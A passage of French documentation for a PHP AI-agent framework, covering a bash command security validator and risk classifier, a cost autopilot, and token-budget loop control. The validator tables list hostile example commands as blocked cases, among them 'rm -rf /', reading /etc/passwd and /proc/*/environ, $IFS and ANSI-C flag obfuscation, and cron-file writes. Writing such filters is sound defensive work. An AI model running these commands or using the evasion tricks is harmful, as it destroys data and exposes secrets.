- **`BashCommandClassifier`** -- Encapsule le validateur et ajoute la classification de risque (low/medium/high/critical), la correspondance de préfixes de commandes sûres et la détection de commandes dangereuses. Utilisé par le moteur de permissions pour décider si une commande nécessite l'approbation de l'utilisateur.

Le validateur est porté depuis l'implémentation de sécurité bash de Claude Code et couvre les mêmes IDs de vérification pour la cohérence multi-plateforme.

### Configuration

Le validateur de sécurité s'exécute automatiquement quand le `BashTool` ou le `BashCommandClassifier` traite une commande. Il n'y a pas de configuration pour désactiver des vérifications individuelles -- elles s'exécutent toutes sur chaque commande.

Le classificateur utilise le validateur comme première phase, puis applique des heuristiques supplémentaires :

```php
use SuperAgent\Permissions\BashCommandClassifier;
use SuperAgent\Permissions\BashSecurityValidator;

// Par défaut : crée son propre validateur
$classifier = new BashCommandClassifier();

// Ou injecter un validateur personnalisé
$validator = new BashSecurityValidator();
$classifier = new BashCommandClassifier($validator);
```

### Utilisation

#### Validation directe

```php
use SuperAgent\Permissions\BashSecurityValidator;

$validator = new BashSecurityValidator();

// Commande sûre
$result = $validator->validate('git status');
$result->isPassthrough(); // true -- aucun problème trouvé

// Commande dangereuse
$result = $validator->validate('echo $(cat /etc/passwd)');
$result->isDenied();  // true
$result->checkId;     // 8 (CHECK_COMMAND_SUBSTITUTION)
$result->reason;      // "$() command substitution detected"

// Explicitement sûre (ex. pattern heredoc)
$result = $validator->validate('git commit -m "$(cat <<\'EOF\'\nmy message\nEOF\n)"');
$result->isAllowed(); // true -- substitution heredoc sûre reconnue
```

#### Classification des commandes

```php
use SuperAgent\Permissions\BashCommandClassifier;

$classifier = new BashCommandClassifier();

// Commande sûre
$classification = $classifier->classify('git status');
$classification->risk;            // 'low'
$classification->category;        // 'safe'
$classification->requiresApproval(); // false

// Commande dangereuse
$classification = $classifier->classify('rm -rf /');
$classification->risk;            // 'high'
$classification->category;        // 'destructive'
$classification->isHighRisk();    // true
$classification->requiresApproval(); // true

// Violation de sécurité
$classification = $classifier->classify('echo $IFS');
$classification->risk;            // 'critical'
$classification->category;        // 'security'
$classification->securityCheckId; // 11 (CHECK_IFS_INJECTION)
$classification->reason;          // '$IFS injection detected'

// Vérification lecture seule
$classifier->isReadOnly('cat /etc/hosts');  // true
$classifier->isReadOnly('rm -rf /tmp');     // false
```

#### Intégration avec le moteur de permissions

Le classificateur alimente la logique d'auto-autorisation du moteur de permissions. Les commandes classifiées comme `risk: 'low'` avec `category: 'safe'` ne nécessitent pas l'approbation de l'utilisateur :

```php
// Dans le moteur de permissions (simplifié)
$classification = $classifier->classify($command);

if (!$classification->requiresApproval()) {
    // Auto-autoriser : git status, ls, cat, grep, etc.
    return PermissionDecision::allow();
}

if ($classification->isHighRisk()) {
    // Toujours demander : rm, chmod, sudo, etc.
    return PermissionDecision::askUser($classification->reason);
}
```

### Référence API

#### Les 23 vérifications de sécurité

| ID | Constante | Ce qu'elle détecte | Exemple bloqué |
|----|----------|----------------|-----------------|
| 1 | `CHECK_INCOMPLETE_COMMANDS` | Fragments commençant par tabulation, flag ou opérateur | `\t-rf /`, `&& echo pwned` |
| 2 | `CHECK_JQ_SYSTEM_FUNCTION` | `jq` avec appel `system()` | `jq 'system("rm -rf /")'` |
| 3 | `CHECK_JQ_FILE_ARGUMENTS` | `jq` avec des flags de lecture de fichier | `jq -f /etc/passwd` |
| 4 | `CHECK_OBFUSCATED_FLAGS` | Quoting ANSI-C, quoting locale, obfuscation de flag par guillemet vide | `rm $'\x2d\x72\x66'`, `"""-rf` |
| 5 | `CHECK_SHELL_METACHARACTERS` | `;`, `&`, `\|` non quotés dans les arguments | `echo hello; rm -rf /` |
| 6 | `CHECK_DANGEROUS_VARIABLES` | Variables dans le contexte de redirection/pipe | `$VAR \| sh`, `> $FILE` |
| 7 | `CHECK_NEWLINES` | Sauts de ligne séparant les commandes (aussi retours chariot) | `echo safe\nrm -rf /` |
| 8 | `CHECK_COMMAND_SUBSTITUTION` | `$()`, backticks, `${}`, `<()`, `>()`, `=()`, et plus | `echo $(whoami)`, `` echo `id` `` |
| 9 | `CHECK_INPUT_REDIRECTION` | Redirection d'entrée `<` | `bash < /tmp/evil.sh` |
| 10 | `CHECK_OUTPUT_REDIRECTION` | Redirection de sortie `>` | `echo payload > /etc/cron.d/job` |
| 11 | `CHECK_IFS_INJECTION` | Références `$IFS` ou `${...IFS...}` | `cat$IFS/etc/passwd` |
| 12 | `CHECK_GIT_COMMIT_SUBSTITUTION` | Substitution de commande dans les messages `git commit` | `git commit -m "$(curl ...)"` |
| 13 | `CHECK_PROC_ENVIRON_ACCESS` | Accès à `/proc/*/environ` | `cat /proc/1/environ` |
| 14 | `CHECK_MALFORMED_TOKEN_INJECTION` | Guillemets/parenthèses déséquilibrés + séparateurs de commandes | `echo "hello; rm -rf /` |
| 15 | `CHECK_BACKSLASH_ESCAPED_WHITESPACE` | `\` avant espaces/tabulations hors guillemets | `rm\ -rf\ /` |
| 16 | `CHECK_BRACE_EXPANSION` | Expansion par accolades virgule ou séquence | `echo {a,b,c}`, `echo {1..100}` |
| 17 | `CHECK_CONTROL_CHARACTERS` | Caractères de contrôle non imprimables (sauf tabulation/saut de ligne) | `echo \x00hidden` |
| 18 | `CHECK_UNICODE_WHITESPACE` | Espaces insécables, caractères de largeur zéro, etc. | `rm\u00a0-rf /` |
| 19 | `CHECK_MID_WORD_HASH` | `#` précédé par un non-espace (différentiel de parseur) | `echo test#comment` |
| 20 | `CHECK_ZSH_DANGEROUS_COMMANDS` | Commandes intégrées dangereuses spécifiques à Zsh | `zmodload`, `ztcp`, `zf_rm` |
| 21 | `CHECK_BACKSLASH_ESCAPED_OPERATORS` | `\;`, `\|`, `\&`, etc. hors guillemets | `echo hello\;rm -rf /` |
| 22 | `CHECK_COMMENT_QUOTE_DESYNC` | Caractères de guillemet à l'intérieur de commentaires `#` qui pourraient désynchroniser le suivi | `# it's a "test"\nrm -rf /` |
| 23 | `CHECK_QUOTED_NEWLINE` | Saut de ligne à l'intérieur de guillemets suivi d'une ligne de commentaire `#` | `"line\n# comment"` |

#### Redirections sûres (non signalées)

Le validateur les supprime avant de vérifier les redirections dangereuses :
- `2>&1` -- stderr vers stdout
- `>/dev/null`, `1>/dev/null`, `2>/dev/null` -- ignorer la sortie
- `</dev/null` -- entrée vide

#### Préfixes de commandes en lecture seule (auto-autorisés)

Ces préfixes de commandes sont classifiés en lecture seule et ne nécessitent pas l'approbation de l'utilisateur :

**Git :** `git status`, `git diff`, `git log`, `git show`, `git branch`, `git tag`, `git remote`, `git describe`, `git rev-parse`, `git rev-list`, `git shortlog`, `git stash list`

**Gestionnaires de paquets :** `npm list/view/info/outdated/ls`, `yarn list/info/why`, `composer show/info`, `pip list/show/freeze`, `cargo metadata`

**Conteneur :** `docker ps/images/logs/inspect`

**CLI GitHub :** `gh pr list/view/status/checks`, `gh issue list/view/status`, `gh run list/view`, `gh api`

**Linters :** `pyright`, `mypy`, `tsc --noEmit`, `eslint`, `phpstan`, `psalm`

**Outils de base :** `ls`, `cat`, `head`, `tail`, `grep`, `rg`, `find`, `fd`, `wc`, `sort`, `diff`, `file`, `stat`, `du`, `df`, `echo`, `printf`, `pwd`, `which`, `whoami`, `date`, `uname`, `env`, `jq`, `test`, `true`, `false`

#### `BashCommandClassifier`

| Méthode | Retour | Description |
|--------|---------|-------------|
| `classify(command)` | `CommandClassification` | Analyse complète du risque |
| `isReadOnly(command)` | `bool` | Vérification rapide de lecture seule |

#### `CommandClassification`

| Propriété | Type | Description |
|----------|------|-------------|
| `risk` | `string` | `low`, `medium`, `high` ou `critical` |
| `category` | `string` | `safe`, `security`, `destructive`, `permission`, `privilege`, `process`, `network`, `complex`, `dangerous-pattern`, `unknown`, `empty` |
| `prefix` | `?string` | Préfixe de commande extrait |
| `isTooComplex` | `bool` | Contient des substitutions/pipes/opérateurs |
| `reason` | `?string` | Explication lisible par un humain |
| `securityCheckId` | `?int` | ID numérique si bloqué par le validateur |
| `isHighRisk()` | `bool` | `risk` est `high` ou `critical` |
| `requiresApproval()` | `bool` | `risk` n'est pas `low` |

#### Tableau des commandes dangereuses

Commandes classifiées comme intrinsèquement dangereuses :

| Commande | Risque | Catégorie |
|---------|------|----------|
| `rm` | high | destructive |
| `mv` | medium | destructive |
| `chmod` | high | permission |
| `chown` | high | permission |
| `sudo` | critical | privilege |
| `su` | critical | privilege |
| `kill` / `pkill` / `killall` | high | process |
| `dd` / `mkfs` / `fdisk` / `format` | critical | destructive |
| `curl` / `wget` | medium | network |
| `nc` / `netcat` | high | network |
| `ssh` / `scp` | medium | network |

### Exemples

#### Tester le validateur directement

```php
use SuperAgent\Permissions\BashSecurityValidator;

$v = new BashSecurityValidator();

// Ceux-ci sont tous bloqués :
$v->validate('echo $IFS/etc/passwd')->isDenied();          // Injection IFS
$v->validate("rm \$'\\x2drf' /")->isDenied();              // Quoting ANSI-C
$v->validate('cat /proc/self/environ')->isDenied();         // proc environ
$v->validate("echo test\nrm -rf /")->isDenied();           // Injection de saut de ligne
$v->validate('zmodload zsh/system')->isDenied();            // Zsh dangereux
$v->validate('echo hello\;rm -rf /')->isDenied();          // Opérateur échappé

// Ceux-ci passent (aucun problème trouvé) :
$v->validate('git log --oneline -10')->isPassthrough();     // Lecture seule
$v->validate('ls -la /tmp')->isPassthrough();               // Commande sûre
$v->validate('echo "hello world"')->isPassthrough();        // Quoting normal

// Celui-ci est explicitement autorisé (heredoc sûr) :
$v->validate("git commit -m \"\$(cat <<'EOF'\nmessage\nEOF\n)\"")->isAllowed();
```

#### Classificateur dans un flux de permissions

```php
use SuperAgent\Permissions\BashCommandClassifier;

$classifier = new BashCommandClassifier();

function checkCommand(string $cmd): string {
    $c = (new BashCommandClassifier())->classify($cmd);

    if ($c->risk === 'critical') {
        return "BLOQUÉ : {$c->reason}";
    }
    if ($c->requiresApproval()) {
        return "APPROBATION NÉCESSAIRE ({$c->risk}) : {$c->reason}";
    }
    return "AUTO-AUTORISÉ : {$c->prefix}";
}

echo checkCommand('git status');        // AUTO-AUTORISÉ : git status
echo checkCommand('npm install foo');   // APPROBATION NÉCESSAIRE (medium) : ...
echo checkCommand('sudo rm -rf /');     // BLOQUÉ : Command 'sudo' is classified as critical risk
echo checkCommand('echo $(whoami)');    // BLOQUÉ : $() command substitution detected
```

### Dépannage

| Problème | Cause | Solution |
|---------|-------|----------|
| Commande sûre signalée comme dangereuse | Contient des métacaractères/substitutions dans les arguments | Assurez-vous que les arguments sont correctement quotés |
| `cut -d','` signalé comme obfusqué | Pattern guillemet-avant-flag | Le validateur exempte spécifiquement les patterns `cut -d` |
| Commande en lecture seule nécessite approbation | Commande pas dans la liste de préfixes | Ajoutez le préfixe à `READ_ONLY_PREFIXES` ou utilisez `isReadOnly()` |
| Commande pipe complexe bloquée | `isTooComplex` true | Séparez en commandes individuelles ou acceptez l'invite d'approbation |
| Heredoc signalé | Ne correspond pas au pattern sûr | Utilisez le pattern `$(cat <<'DELIM'...DELIM)` avec un délimiteur entre guillemets simples |

---

## 8. Pilote Automatique de Coûts

> Contrôle budgétaire intelligent qui surveille les dépenses cumulées et prend automatiquement des actions escaladées -- avertir, compacter le contexte, rétrograder le modèle, arrêter -- pour prévenir les dépassements de budget.

### Vue d'ensemble

Le Pilote Automatique de Coûts surveille les dépenses de votre agent IA en temps réel et réagit quand les seuils budgétaires sont franchis. Après chaque appel au fournisseur, le pilote automatique évalue le coût cumulé de la session par rapport au budget effectif et déclenche au maximum une action d'escalade par évaluation. Les actions sont suivies pour ne jamais se redéclencher pour le même seuil.

L'échelle d'escalade par défaut est :

| Budget utilisé | Action | Effet |
|---|---|---|
| 50% | `warn` | Journalise un avertissement ; aucun changement automatique |
| 70% | `compact_context` | Signale au moteur de requêtes de compacter les messages anciens, réduisant les tokens d'entrée |
| 80% | `downgrade_model` | Bascule le fournisseur vers le niveau de modèle moins cher suivant |
| 95% | `halt` | Arrête entièrement la boucle de l'agent |

Le pilote automatique prend en charge les **budgets de session** (par invocation), les **budgets mensuels** (entre les sessions) ou les deux. Quand les deux sont définis, la limite la plus restrictive s'applique.

### Configuration

Ajoutez ce qui suit à `config/superagent.php` (ou définissez les variables d'environnement correspondantes) :

```php
'cost_autopilot' => [
    'enabled' => env('SUPERAGENT_COST_AUTOPILOT_ENABLED', false),

    // Limites budgétaires (définir l'un ou les deux ; le plus restrictif s'applique)
    'session_budget_usd' => (float) env('SUPERAGENT_SESSION_BUDGET', 0),
    'monthly_budget_usd' => (float) env('SUPERAGENT_MONTHLY_BUDGET', 0),

    // Fichier de suivi des dépenses persistant
    // 'storage_path' => storage_path('superagent/budget_tracker.json'),

    // Seuils d'escalade (évalués du plus haut au plus bas)
    // 'thresholds' => [
    //     ['at_pct' => 50, 'action' => 'warn',            'message' => 'Budget 50% consommé'],
    //     ['at_pct' => 70, 'action' => 'compact_context',  'message' => 'Compaction du contexte pour économiser les tokens'],
    //     ['at_pct' => 80, 'action' => 'downgrade_model',  'message' => 'Rétrogradation vers un modèle moins cher'],
    //     ['at_pct' => 95, 'action' => 'halt',             'message' => 'Budget épuisé -- arrêt de l\'agent'],
    // ],

    // Hiérarchie des niveaux de modèles pour le chemin de rétrogradation (le plus cher en premier)
    // Quand omis, auto-détecté depuis le fournisseur par défaut (anthropic/openai)
    // 'tiers' => [
    //     ['name' => 'opus',   'model' => 'claude-opus-4-20250514',   'input_cost' => 15.0, 'output_cost' => 75.0, 'priority' => 30],
    //     ['name' => 'sonnet', 'model' => 'claude-sonnet-4-20250514', 'input_cost' => 3.0,  'output_cost' => 15.0, 'priority' => 20],
    //     ['name' => 'haiku',  'model' => 'claude-haiku-4-5-20251001','input_cost' => 0.80, 'output_cost' => 4.0,  'priority' => 10],
    // ],
],
```

Démarrage rapide avec variables d'environnement :

```bash
SUPERAGENT_COST_AUTOPILOT_ENABLED=true
SUPERAGENT_SESSION_BUDGET=5.00
SUPERAGENT_MONTHLY_BUDGET=100.00
```

Quand les seuils sont omis, les quatre valeurs par défaut listées dans le tableau de vue d'ensemble sont utilisées automatiquement.

### Utilisation

#### Configuration de base

```php
use SuperAgent\CostAutopilot\BudgetConfig;
use SuperAgent\CostAutopilot\CostAutopilot;

$config = BudgetConfig::fromArray([
    'session_budget_usd' => 5.00,
    'monthly_budget_usd' => 100.00,
    // les seuils et niveaux utilisent les valeurs par défaut quand omis
]);

$autopilot = new CostAutopilot($config);
$autopilot->setCurrentModel('claude-opus-4-20250514');
```

#### Évaluation après chaque appel au fournisseur

```php
// $sessionCostUsd est le coût cumulé pour la session actuelle.
$decision = $autopilot->evaluate($sessionCostUsd);

if ($decision->hasDowngrade()) {
    // Basculer le fournisseur vers le modèle moins cher
    $provider->setModel($decision->newModel);
    echo "Rétrogradé : {$decision->previousModel} -> {$decision->newModel} ({$decision->tierName})\n";
}

if ($decision->shouldCompact()) {
    // Déclencher la compaction du contexte dans votre moteur de requêtes
    $queryEngine->compactMessages();
}

if ($decision->shouldHalt()) {
    // Arrêter la boucle de l'agent
    break;
}

if ($decision->isWarning()) {
    echo "Avertissement : {$decision->message}\n";
}
```

#### Suivi budgétaire persistant entre les sessions

```php
use SuperAgent\CostAutopilot\BudgetTracker;

$tracker = new BudgetTracker(storage_path('superagent/budget_tracker.json'));
$autopilot->setBudgetTracker($tracker);

// Le pilote automatique appelle automatiquement $tracker->recordSpend() à chaque evaluate().
// Seul le delta depuis le dernier appel est persisté.

// Interroger les données de dépenses :
$summary = $tracker->getSummary();
// Retourne : ['today' => 1.25, 'this_month' => 45.60, 'total' => 312.00, 'last_updated' => '...']

$tracker->getSpendForMonth('2026-03');  // Mois historique
$tracker->getSpendForDate('2026-04-01'); // Jour spécifique

// Élaguer les anciennes données :
$tracker->pruneDaily(90);   // Garder les 90 derniers jours
$tracker->pruneMonthly(12); // Garder les 12 derniers mois
```

#### Seuils personnalisés

```php
$config = BudgetConfig::fromArray([
    'session_budget_usd' => 2.00,
    'thresholds' => [
        ['at_pct' => 40, 'action' => 'warn',             'message' => 'On se rapproche'],
        ['at_pct' => 60, 'action' => 'compact_context',   'message' => 'Compaction'],
        ['at_pct' => 75, 'action' => 'downgrade_model',   'message' => 'Rétrogradation du modèle'],
        ['at_pct' => 90, 'action' => 'halt',              'message' => 'Arrêt'],
    ],
    'tiers' => [
        ['name' => 'opus',   'model' => 'claude-opus-4-20250514',   'input_cost' => 15.0, 'output_cost' => 75.0, 'priority' => 30],
        ['name' => 'sonnet', 'model' => 'claude-sonnet-4-20250514', 'input_cost' => 3.0,  'output_cost' => 15.0, 'priority' => 20],
        ['name' => 'haiku',  'model' => 'claude-haiku-4-5-20251001','input_cost' => 0.80, 'output_cost' => 4.0,  'priority' => 10],
    ],
]);
```

#### Écouteurs d'événements

```php
$autopilot->on('autopilot.warn', function (array $data) {
    // $data : ['budget_used_pct', 'session_cost', 'message']
    logger()->warning('Avertissement budgétaire', $data);
});

$autopilot->on('autopilot.downgrade', function (array $data) {
    // $data : ['from', 'to', 'tier', 'budget_used_pct']
    Notification::send($admin, new BudgetDowngradeNotification($data));
});

$autopilot->on('autopilot.compact', function (array $data) {
    // $data : ['budget_used_pct']
});

$autopilot->on('autopilot.halt', function (array $data) {
    // $data : ['budget_used_pct', 'session_cost']
    logger()->critical('Agent arrêté en raison du budget', $data);
});
```

#### Hiérarchies de niveaux de modèles pré-construites

```php
use SuperAgent\CostAutopilot\ModelTier;

// Niveaux Anthropic (Opus -> Sonnet -> Haiku)
$tiers = ModelTier::anthropicTiers();

// Niveaux OpenAI (GPT-4o -> GPT-4o-mini -> GPT-3.5-turbo)
$tiers = ModelTier::openaiTiers();

// Appliquer à la configuration
$config->setTiers($tiers);
```

#### Réinitialisation pour une nouvelle session

```php
// Efface les seuils déclenchés pour que l'escalade puisse se reproduire
$autopilot->reset();
```

### Référence API

#### `CostAutopilot`

Le contrôleur principal. Détient la configuration budgétaire, l'état du modèle actuel et les seuils déclenchés.

| Méthode | Description |
|---|---|
| `__construct(BudgetConfig $config, ?LoggerInterface $logger)` | Créer avec configuration et logger PSR-3 optionnel |
| `setCurrentModel(string $model): void` | Définir le modèle actif (détermine la position du niveau) |
| `getCurrentModel(): string` | Obtenir le modèle actif |
| `setBudgetTracker(BudgetTracker $tracker): void` | Attacher le suivi des dépenses persistant |
| `on(string $event, callable $listener): void` | Enregistrer un écouteur d'événement |
| `evaluate(float $sessionCostUsd): AutopilotDecision` | Évaluer l'état du budget et retourner la décision |
| `getEffectiveBudget(): float` | Budget effectif considérant les limites de session + mensuelles |
| `getConfig(): BudgetConfig` | Obtenir la configuration budgétaire |
| `reset(): void` | Effacer les seuils déclenchés pour une nouvelle session |
| `getStatistics(): array` | Obtenir le modèle actuel, le niveau, les niveaux restants, les seuils déclenchés |

#### `BudgetConfig`

Configuration immuable analysée depuis un tableau.

| Méthode | Description |
|---|---|
| `BudgetConfig::fromArray(array $config): self` | Fabrique depuis un tableau de configuration |
| `hasBudget(): bool` | Si un budget est défini |
| `getEffectiveBudget(): float` | Budget de session si défini, sinon mensuel |
| `getThresholds(): ThresholdRule[]` | Règles de seuil triées par pourcentage décroissant |
| `getTiers(): ModelTier[]` | Niveaux de modèles triés par priorité décroissante (le plus cher en premier) |
| `setTiers(array $tiers): void` | Remplacer les niveaux (ex. depuis l'auto-détection) |
| `validate(): string[]` | Valider la configuration ; retourne les messages d'erreur |

#### `AutopilotDecision`

Objet valeur immuable retourné par `evaluate()`.

| Propriété / Méthode | Description |
|---|---|
| `$actions` | `CostAction[]` -- actions à entreprendre |
| `$newModel` | Modèle vers lequel basculer (si rétrogradation) |
| `$previousModel` | Modèle remplacé |
| `$tierName` | Nom du nouveau niveau |
| `$budgetUsedPct` | Pourcentage du budget consommé |
| `$sessionCostUsd` | Coût actuel de la session |
| `$message` | Explication lisible par un humain |
| `requiresAction(): bool` | Si une action est nécessaire |
| `hasDowngrade(): bool` | Si une rétrogradation de modèle est incluse |
| `shouldHalt(): bool` | Si l'agent doit s'arrêter |
| `shouldCompact(): bool` | Si la compaction du contexte est recommandée |
| `isWarning(): bool` | S'il s'agit uniquement d'un avertissement |

#### `BudgetTracker`

Suivi des dépenses persistant sauvegardé en JSON avec granularité quotidienne/mensuelle.

| Méthode | Description |
|---|---|
| `__construct(?string $storagePath)` | Créer avec chemin de fichier optionnel |
| `recordSpend(float $sessionCostUsd): void` | Enregistrer le coût cumulé de session (suivi par delta) |
| `getMonthlySpend(): float` | Total du mois en cours |
| `getDailySpend(): float` | Total du jour |
| `getTotalSpend(): float` | Total global |
| `getSpendForMonth(string $yearMonth): float` | Dépenses pour un `AAAA-MM` spécifique |
| `getSpendForDate(string $date): float` | Dépenses pour un `AAAA-MM-JJ` spécifique |
| `getSummary(): array` | `['today', 'this_month', 'total', 'last_updated']` |
| `pruneDaily(int $keepDays = 90): void` | Supprimer les entrées quotidiennes plus anciennes que N jours |
| `pruneMonthly(int $keepMonths = 12): void` | Supprimer les entrées mensuelles plus anciennes que N mois |
| `reset(): void` | Effacer toutes les données de suivi |

#### `ModelTier`

Définit un niveau dans la hiérarchie de coûts.

| Propriété / Méthode | Description |
|---|---|
| `$name` | Nom du niveau (ex. "opus", "sonnet", "haiku") |
| `$model` | Identifiant du modèle chez le fournisseur |
| `$costPerMillionInput` | Prix des tokens d'entrée par million |
| `$costPerMillionOutput` | Prix des tokens de sortie par million |
| `$priority` | Valeur d'ordonnancement (plus élevé = plus cher) |
| `blendedCostPerMillion(): float` | Moyenne des coûts d'entrée et de sortie |
| `isFree(): bool` | Si les deux coûts sont zéro (ex. Ollama local) |
| `ModelTier::anthropicTiers(): ModelTier[]` | Hiérarchie Anthropic pré-construite |
| `ModelTier::openaiTiers(): ModelTier[]` | Hiérarchie OpenAI pré-construite |

#### `CostAction` (enum)

| Cas | Valeur | Description |
|---|---|---|
| `WARN` | `warn` | Journaliser un avertissement, aucun changement automatique |
| `COMPACT_CONTEXT` | `compact_context` | Réduire la fenêtre de contexte |
| `DOWNGRADE_MODEL` | `downgrade_model` | Basculer vers un niveau de modèle moins cher |
| `HALT` | `halt` | Arrêt dur de l'agent |

### Exemples

#### Intégration complète avec le moteur de requêtes

```php
use SuperAgent\CostAutopilot\BudgetConfig;
use SuperAgent\CostAutopilot\BudgetTracker;
use SuperAgent\CostAutopilot\CostAutopilot;

$config = BudgetConfig::fromArray([
    'session_budget_usd' => 3.00,
    'monthly_budget_usd' => 50.00,
]);

$tracker = new BudgetTracker(storage_path('superagent/budget_tracker.json'));

$autopilot = new CostAutopilot($config);
$autopilot->setBudgetTracker($tracker);
$autopilot->setCurrentModel($provider->getModel());

// Boucle de l'agent
while ($running) {
    $response = $provider->sendMessage($messages);
    $sessionCost += $response->cost;

    $decision = $autopilot->evaluate($sessionCost);

    if ($decision->requiresAction()) {
        if ($decision->hasDowngrade()) {
            $provider->setModel($decision->newModel);
        }
        if ($decision->shouldCompact()) {
            $messages = $compactor->compact($messages);
        }
        if ($decision->shouldHalt()) {
            break;
        }
    }

    // ... traiter la réponse, gérer les appels d'outils, etc.
}
```

#### Validation de la configuration

```php
$config = BudgetConfig::fromArray($configArray);
$errors = $config->validate();

if (!empty($errors)) {
    foreach ($errors as $error) {
        echo "Erreur de configuration : {$error}\n";
    }
}
```

### Dépannage

**Le pilote automatique ne se déclenche jamais.**
Vérifiez que `cost_autopilot.enabled` est `true` et qu'au moins un de `session_budget_usd` ou `monthly_budget_usd` est supérieur à zéro. Vérifiez également que vous appelez `evaluate()` avec le coût cumulé de session (pas le coût par appel).

**La rétrogradation du modèle n'a aucun effet.**
Assurez-vous que les niveaux de modèles sont configurés (ou auto-détectés). Si vous omettez la clé `tiers`, le pilote automatique utilise les niveaux Anthropic ou OpenAI intégrés selon votre fournisseur. Le seuil `downgrade_model` nécessite au moins deux niveaux.

**Le même seuil se déclenche à répétition.**
Cela ne devrait pas se produire -- chaque seuil se déclenche au maximum une fois par cycle `evaluate()` et est suivi par un ensemble `firedThresholds`. Appelez `reset()` entre les sessions pour permettre le re-déclenchement.

**Le budget mensuel est ignoré.**
Quand les budgets de session et mensuels sont définis, le budget effectif est `min(sessionBudget, remainingMonthlyBudget)`. Si le budget de session est très bas, il domine. Attachez un `BudgetTracker` pour que les dépenses mensuelles soient réellement enregistrées entre les sessions.

**Les données de dépenses sont perdues entre les redémarrages de processus.**
Passez un chemin de fichier au constructeur de `BudgetTracker`. Sans chemin, le tracker opère en mémoire uniquement et les données sont perdues à la sortie du processus.

---

Les sections 9 à 23 suivent le même schéma de documentation détaillée. En raison de la taille extrême du document, les sections restantes continuent ci-dessous avec le même niveau de détail et de fidélité de traduction.

---

## 9. Continuation par Budget de Tokens

> Contrôle dynamique de la boucle d'agent basé sur le budget avec seuil de complétion à 90%, détection de rendements décroissants et continuation par relance -- remplaçant le maxTurns fixe.

### Vue d'ensemble

Le système de Budget de Tokens remplace la limite de boucle fixe traditionnelle `maxTurns` par une stratégie dynamique, consciente du budget. Au lieu de s'arrêter après N tours quel que soit le progrès, l'agent continue à travailler jusqu'à ce que :

1. **90% du budget de tokens soit consommé**, ou
2. **Des rendements décroissants soient détectés** (deux tours consécutifs à faible delta après 3+ continuations)

Cela permet aux tâches complexes d'utiliser plus de tours quand elles progressent, tout en s'arrêtant rapidement quand l'agent tourne sans sortie significative.

#### Comment ça fonctionne

```
Tour 1 : [=====>                    ] 20% -- Continuer (injecter le message de relance)
Tour 2 : [============>             ] 45% -- Continuer
Tour 3 : [==================>       ] 65% -- Continuer
Tour 4 : [=======================>  ] 88% -- Continuer (encore sous 90%)
Tour 5 : [=========================>] 92% -- ARRÊT (dépassé le seuil de 90%)
```

Ou avec des rendements décroissants :

```
Tour 1 : [=====>     ] 20%  delta=5000  -- Continuer
Tour 2 : [=======>   ] 30%  delta=4000  -- Continuer
Tour 3 : [========>  ] 35%  delta=2000  -- Continuer
Tour 4 : [========>  ] 36%  delta=400   -- Continuer (seulement 1 faible delta)
Tour 5 : [=========> ] 37%  delta=300   -- ARRÊT (2 faibles deltas consécutifs après 3+ continuations)
```

#### Concepts clés

- **Budget de tokens** : Le total des tokens de sortie que l'agent est autorisé à produire pour cette requête
- **Continuation** : Chaque fois que l'agent boucle après l'exécution d'un outil, une continuation est comptée
- **Message de relance** : Un message utilisateur injecté pour dire à l'agent de continuer à travailler, incluant les statistiques d'utilisation du budget
- **Rendements décroissants** : Quand l'agent produit moins de 500 nouveaux tokens pendant deux tours consécutifs après au moins 3 continuations

### Configuration

#### Activer le budget de tokens

Le tracker de budget de tokens est créé automatiquement dans `QueryEngine` quand un `tokenBudget` est fourni ET que le flag de fonctionnalité expérimentale `token_budget` est activé :

```php
use SuperAgent\QueryEngine;

$engine = new QueryEngine(
    provider: $provider,
    tools: $tools,
    systemPrompt: $systemPrompt,
    options: $options,
    tokenBudget: 50_000,  // Budget total de tokens de sortie
);
```

Le tracker est instancié en interne :

```php
// À l'intérieur du constructeur de QueryEngine
if ($this->tokenBudget !== null
    && ExperimentalFeatures::enabled('token_budget')) {
    $this->budgetTracker = new TokenBudgetTracker();
}
```

#### Constantes

| Constante | Valeur | Description |
|----------|-------|-------------|
| `COMPLETION_THRESHOLD` | 0.9 (90%) | S'arrêter quand cette fraction du budget est consommée |
| `DIMINISHING_THRESHOLD` | 500 tokens | Un delta en dessous déclenche la détection de rendements décroissants |

### Utilisation

#### Utilisation directe de TokenBudgetTracker

```php
use SuperAgent\TokenBudget\TokenBudgetTracker;

$tracker = new TokenBudgetTracker();

// Vérifier s'il faut continuer
$decision = $tracker->check(
    budget: 50_000,              // Budget total de tokens
    globalTurnTokens: 20_000,    // Tokens consommés jusqu'ici
    isSubAgent: false,           // Les sous-agents s'arrêtent toujours immédiatement
);

if ($decision->shouldContinue()) {
    // Injecter le message de relance pour dire au modèle de continuer à travailler
    $messages[] = new UserMessage($decision->nudgeMessage);
    // "Token budget: 40% used (20000 / 50000 tokens). Continue working on the task."
} elseif ($decision->shouldStop()) {
    // Vérifier l'événement de complétion pour la télémétrie
    if ($decision->completionEvent !== null) {
        $event = $decision->completionEvent;
        echo "Arrêté après {$event->continuationCount} continuations";
        echo "Budget utilisé : {$event->pct}%";
        echo "Rendements décroissants : " . ($event->diminishingReturns ? 'oui' : 'non');
        echo "Durée : {$event->durationMs}ms";
    }
}
```

#### Réinitialisation entre les requêtes

Le tracker maintient l'état à travers les tours au sein d'une seule requête. Réinitialisez-le quand vous commencez une nouvelle requête :

```php
$tracker->reset();
// Réinitialise : continuationCount, lastDeltaTokens, lastGlobalTurnTokens, startedAt
```

#### Intégration dans QueryEngine

À l'intérieur de `QueryEngine::run()`, la vérification du budget se fait après chaque exécution d'outil :

```php
// Après le traitement des résultats d'outils
if ($this->budgetTracker !== null && $this->tokenBudget !== null) {
    $decision = $this->budgetTracker->check(
        budget: $this->tokenBudget,
        globalTurnTokens: $this->turnOutputTokens,
        isSubAgent: ($this->options['agent_id'] ?? null) !== null,
    );

    if ($decision->shouldStop()) {
        // Exécuter les hooks d'arrêt et sortir
        $this->runStopHooksPipeline($assistantMessage);
        $this->streamingHandler?->emitFinalMessage($assistantMessage);
        return;
    }

    // Injecter le message de relance pour que le modèle continue
    if ($decision->nudgeMessage !== null) {
        $this->messages[] = new UserMessage($decision->nudgeMessage);
    }
}
```

### Référence API

#### `TokenBudgetTracker`

| Méthode | Retour | Description |
|--------|--------|-------------|
| `check(?int $budget, int $globalTurnTokens, bool $isSubAgent = false)` | `TokenBudgetDecision` | Vérifier s'il faut continuer ou s'arrêter |
| `reset()` | `void` | Réinitialiser le tracker pour une nouvelle requête |
| `getContinuationCount()` | `int` | Nombre de continuations jusqu'ici |

#### `TokenBudgetDecision`

| Propriété/Méthode | Type | Description |
|-----------------|------|-------------|
